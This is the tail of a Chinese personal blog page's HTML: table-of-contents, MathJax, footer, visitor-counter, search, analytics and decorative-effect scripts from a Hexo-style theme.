            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).slideUp(500);
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).slideDown(500);
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>
    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>

    <footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            &copy; 2019 WeiYang. All Rights Reserved.

            
            &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
            <span class="white-color">4.1k</span>
            

            <br>
            <span id="sitetime"></span>

            
            
            <br>
            
            <span id="busuanzi_container_site_pv" style='display:none'>
                <i class="fa fa-heart-o"></i>
                本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
            <span id="busuanzi_container_site_uv" style='display:none'>
                人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
            </span>
            
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/https://github.com/H01k" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="mailto:49335564@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="https://zhihu.com/people/H01k" class="tooltipped" target="_blank" data-tooltip="访问我的知乎" data-position="top" data-delay="50">
        <i class="fa fa-inverse">知</i>
    </a>



    <a href="https://user.qzone.qq.com/49335564" class="tooltipped" target="_blank" data-tooltip="访问我的QQ空间" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>



    <a href="https://weibo.com/H01k" class="tooltipped" target="_blank" data-tooltip="关注我的微博" data-position="top" data-delay="50">
        <i class="fa fa-weibo"></i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fa fa-rss"></i>
    </a>
</div>
    </div>
</footer>

<div class="progress-bar"></div>

<!-- 不蒜子计数初始值纠正 -->
<script>
    $(document).ready(function () {

        var int = setInterval(fixCount, 50);
        var pvcountOffset = 80000;
        var uvcountOffset = 20000;

        function fixCount() {
            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
                clearInterval(int);
            }
            if ($("#busuanzi_container_site_pv").css("display") != "none") {
                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
                clearInterval(int);
            }
        }
    });
</script>

<script language=javascript>
    function siteTime() {
        window.setTimeout("siteTime()", 1000);
        var seconds = 1000;
        var minutes = seconds * 60;
        var hours = minutes * 60;
        var days = hours * 24;
        var years = days * 365;
        var today = new Date();
        var todayYear = today.getFullYear();
        var todayMonth = today.getMonth() + 1;
        var todayDate = today.getDate();
        var todayHour = today.getHours();
        var todayMinute = today.getMinutes();
        var todaySecond = today.getSeconds();
        /* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
        year - 作为date对象的年份，为4位年份值
        month - 0-11之间的整数，做为date对象的月份
        day - 1-31之间的整数，做为date对象的天数
        hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
        minutes - 0-59之间的整数，做为date对象的分钟数
        seconds - 0-59之间的整数，做为date对象的秒数
        microseconds - 0-999之间的整数，做为date对象的毫秒数 */
        var t1 = Date.UTC(2017, 09, 11, 00, 00, 00); //北京时间2018-2-13 00:00:00
        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
        var diff = t2 - t1;
        var diffYears = Math.floor(diff / years);
        var diffDays = Math.floor((diff / days) - diffYears * 365);
        var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
        var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
        var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
        document.getElementById("sitetime").innerHTML = "本站已运行 " + diffYears + " 年 " + diffDays + " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
    }/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
    siteTime();
</script>

    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
    </script>

    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>



    
    <script src="/libs/others/clicklove.js"></script>
    

    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    <!-- 雪花特效 -->
    
    <script type="text/javascript" src="/libs/others/snow.js"></script>
    

</body>

</html>